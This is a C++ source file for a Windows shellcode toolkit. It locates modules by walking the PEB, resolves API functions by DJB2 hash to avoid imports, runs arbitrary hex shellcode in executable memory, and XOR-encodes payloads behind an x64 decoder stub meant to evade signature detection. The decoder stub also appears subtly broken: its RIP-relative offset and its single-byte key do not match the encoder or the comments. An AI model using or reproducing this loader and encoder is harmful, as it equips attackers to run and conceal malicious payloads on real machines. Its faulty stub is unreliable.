// shellcode_toolkit.cpp — shellcode development toolkit
// Compile: g++ -std=c++17 -o shellcode_toolkit.exe shellcode_toolkit.cpp
// Usage: shellcode_toolkit.exe peb-walk <dll> | resolve <dll> <func> | hash <string>
//                              run <shellcode_hex> | encode <sc_hex> <key_hex> | bof-test <dll> <export>

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string>
#include <vector>
#include <intrin.h>

// ─── DJB2 hash ───────────────────────────────────────────────────────────────

static uint32_t djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h;
}

// ─── PEB walk: resolve module base via TEB.PEB.Ldr ───────────────────────────

typedef struct _UNICODE_STRING {
    USHORT Length, MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA;

typedef struct _PEB {
    BYTE           Reserved[12];
    PEB_LDR_DATA*  Ldr;
} PEB;

static HMODULE peb_find_module(const wchar_t* target_name) {
#ifdef _WIN64
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif
    auto* ldr    = peb->Ldr;
    auto* head   = &ldr->InLoadOrderModuleList;
    auto* entry  = head->Flink;
    while (entry != head) {
        auto* mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (mod->BaseDllName.Buffer) {
            // case-insensitive compare
            bool match = true;
            size_t i = 0;
            for (; target_name[i] && mod->BaseDllName.Buffer[i]; ++i)
                if (towlower(target_name[i]) != towlower(mod->BaseDllName.Buffer[i])) { match = false; break; }
            if (match && !target_name[i] && !mod->BaseDllName.Buffer[i])
                return (HMODULE)mod->DllBase;
        }
        entry = entry->Flink;
    }
    return nullptr;
}

static void cmd_peb_walk(const char* dll) {
    wchar_t wdll[256]{};
    MultiByteToWideChar(CP_ACP, 0, dll, -1, wdll, 256);
    HMODULE base = peb_find_module(wdll);
    if (base) printf("[+] %s base via PEB walk: 0x%p\n", dll, base);
    else      printf("[!] %s not found in PEB module list\n", dll);
}

// ─── Export table walk + hash resolver ───────────────────────────────────────

static FARPROC walk_exports(HMODULE hMod, uint32_t target_hash) {
    auto* base = (const uint8_t*)hMod;
    auto* dos  = (IMAGE_DOS_HEADER*)base;
    auto* nth  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* dir  = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress) return nullptr;
    auto* exp  = (IMAGE_EXPORT_DIRECTORY*)(base + dir->VirtualAddress);
    auto* names  = (DWORD*)(base + exp->AddressOfNames);
    auto* funcs  = (DWORD*)(base + exp->AddressOfFunctions);
    auto* ords   = (WORD* )(base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)(base + names[i]);
        if (djb2(name) == target_hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return nullptr;
}

static void cmd_resolve(const char* dll, const char* func) {
    uint32_t h = djb2(func);
    printf("[*] DJB2(\"%s\") = 0x%08X\n", func, h);
    wchar_t wdll[256]{};
    MultiByteToWideChar(CP_ACP, 0, dll, -1, wdll, 256);
    HMODULE hMod = peb_find_module(wdll);
    if (!hMod) hMod = LoadLibraryA(dll);
    if (!hMod) { fprintf(stderr, "[!] Cannot load %s\n", dll); return; }
    FARPROC fn = walk_exports(hMod, h);
    if (fn) printf("[+] %s!%s -> 0x%p\n", dll, func, fn);
    else    printf("[!] Not found in %s export table\n", dll);
}

// ─── hash <string> ───────────────────────────────────────────────────────────

static void cmd_hash(const char* s) {
    uint32_t h = djb2(s);
    printf("DJB2(\"%s\") = 0x%08X  (%u)\n", s, h, h);
}

// ─── hex decode helper ────────────────────────────────────────────────────────

static std::vector<uint8_t> hex_decode(const char* hex) {
    std::vector<uint8_t> out;
    size_t len = strlen(hex);
    for (size_t i = 0; i + 1 < len; i += 2) {
        char buf[3] = {hex[i], hex[i+1], 0};
        out.push_back((uint8_t)strtoul(buf, nullptr, 16));
    }
    return out;
}

// ─── run <shellcode_hex> ─────────────────────────────────────────────────────

static void cmd_run(const char* hex) {
    auto sc = hex_decode(hex);
    if (sc.empty()) { fprintf(stderr, "Invalid hex\n"); return; }
    printf("[*] Executing %zu byte shellcode\n", sc.size());

    LPVOID mem = VirtualAlloc(nullptr, sc.size(),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { fprintf(stderr, "VirtualAlloc failed: %lu\n", GetLastError()); return; }
    memcpy(mem, sc.data(), sc.size());
    printf("[+] Shellcode at 0x%p\n", mem);

    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    if (!hThread) { fprintf(stderr, "CreateThread failed: %lu\n", GetLastError()); return; }
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ─── encode <sc_hex> <key_hex> ───────────────────────────────────────────────
// XOR encoder + 22-byte x64 decoder stub

static void cmd_encode(const char* sc_hex, const char* key_hex) {
    auto sc  = hex_decode(sc_hex);
    auto key = hex_decode(key_hex);
    if (sc.empty() || key.empty()) { fprintf(stderr, "Invalid hex\n"); return; }

    // XOR encode
    std::vector<uint8_t> enc(sc.size());
    for (size_t i = 0; i < sc.size(); ++i) enc[i] = sc[i] ^ key[i % key.size()];

    printf("[+] XOR-encoded (%zu bytes, key=0x%02X...):\n  ", sc.size(), key[0]);
    for (size_t i = 0; i < enc.size(); ++i) printf("%02X%s", enc[i], i+1<enc.size()?",":"");
    printf("\n\n");

    // 22-byte x64 XOR decoder stub (single-byte key, self-modifying in place)
    // mov rdi, rip+22       ; point to encoded payload
    // mov rcx, <len>        ; loop counter
    // xor byte [rdi], <key> ; XOR each byte
    // inc rdi
    // loop -7               ; loop
    // jmp rdi               ; jump to decoded
    uint8_t stub[22] = {
        0x48,0x8D,0x3D,0x0A,0x00,0x00,0x00,  // lea rdi, [rip+10]
        0x48,0xC7,0xC1,0x00,0x00,0x00,0x00,  // mov rcx, <len>
        0x80,0x37,(uint8_t)key[0],            // xor byte [rdi], key[0]
        0x48,0xFF,0xC7,                        // inc rdi
        0xE2,(uint8_t)(0x100-7),              // loop -7
        // fall through into decoded payload
    };
    *(uint32_t*)(stub + 10) = (uint32_t)enc.size();

    printf("[+] x64 decoder stub (22 bytes) + encoded payload:\n  ");
    for (uint8_t b : stub) printf("%02X,", b);
    for (size_t i = 0; i < enc.size(); ++i) printf("%02X%s", enc[i], i+1<enc.size()?",":"");
    printf("\n");
}

// ─── bof-test <dll> <export> ─────────────────────────────────────────────────

static void cmd_bof_test(const char* dll, const char* exp_name) {
    printf("[*] BOF test: loading %s and calling %s\n", dll, exp_name);
    HMODULE h = LoadLibraryA(dll);
    if (!h) { fprintf(stderr, "Cannot load %s: %lu\n", dll, GetLastError()); return; }
    FARPROC fn = GetProcAddress(h, exp_name);
    if (!fn) { fprintf(stderr, "Cannot find %s in %s\n", exp_name, dll); return; }
    printf("[+] %s!%s @ 0x%p\n", dll, exp_name, fn);
    printf("    First 8 bytes: ");
    uint8_t* p = (uint8_t*)fn;
    for (int i = 0; i < 8; ++i) printf("%02X ", p[i]);
    printf("\n");
    // Verify against hash
    printf("    DJB2 hash: 0x%08X\n", djb2(exp_name));
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:\n"
               "  shellcode_toolkit.exe peb-walk <dll>\n"
               "  shellcode_toolkit.exe resolve  <dll> <func>\n"
               "  shellcode_toolkit.exe hash     <string>\n"
               "  shellcode_toolkit.exe run      <shellcode_hex>\n"
               "  shellcode_toolkit.exe encode   <sc_hex> <key_hex>\n"
               "  shellcode_toolkit.exe bof-test <dll> <export>\n");
        return 1;
    }
    std::string cmd(argv[1]);
    if      (cmd == "peb-walk" && argc >= 3) cmd_peb_walk(argv[2]);
    else if (cmd == "resolve"  && argc >= 4) cmd_resolve(argv[2], argv[3]);
    else if (cmd == "hash"     && argc >= 3) cmd_hash(argv[2]);
    else if (cmd == "run"      && argc >= 3) cmd_run(argv[2]);
    else if (cmd == "encode"   && argc >= 4) cmd_encode(argv[2], argv[3]);
    else if (cmd == "bof-test" && argc >= 4) cmd_bof_test(argv[2], argv[3]);
    else { fprintf(stderr, "Unknown command or missing args.\n"); return 1; }
    return 0;
}
